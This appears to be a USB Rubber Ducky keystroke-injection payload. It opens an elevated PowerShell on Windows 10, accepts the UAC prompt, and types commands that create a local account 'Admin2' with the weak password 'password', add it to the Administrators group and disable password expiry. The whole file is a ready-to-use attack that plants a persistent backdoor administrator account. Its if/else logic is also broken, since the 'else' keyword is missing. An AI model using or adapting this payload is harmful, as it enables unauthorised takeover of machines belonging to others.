REM_BLOCK
Title:       Add_Local_Admin
Author:      LulzAnarchyAnon
Description: Administrator PowerShell is opened, and a script runs that adds a Local Admin User. 
Target:      Windows 10 PowerShell 
Props:       Darren Kitchen, and I am Jakoby
Version:     1.0
Category:    Execution
END_REM

DUCKY_LANG US
DELAY 2000
DEFAULT_DELAY 500

GUI x
STRING a
ALT y

STRINGLN $Username = "Admin2"
STRINGLN $Password = "password"
STRINGLN $group = "Administrators"
STRINGLN $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
STRINGLN $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
STRINGLN if ($existing -eq $null) {
STRINGLN    Write-Host "Creating new local user $Username."
STRINGLN    & NET USER $Username $Password /add /y /expires:never
STRINGLN    Write-Host "Adding local user $Username to $group."
STRINGLN    & NET LOCALGROUP $group $Username /add
STRINGLN }
STRINGLN      {
STRINGLN    Write-Host "Setting password for existing local user $Username."
STRINGLN    $existing.SetPassword($Password)
STRINGLN }
STRINGLN Write-Host "Ensuring password for $Username never expires."
STRINGLN & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
STRINGLN exit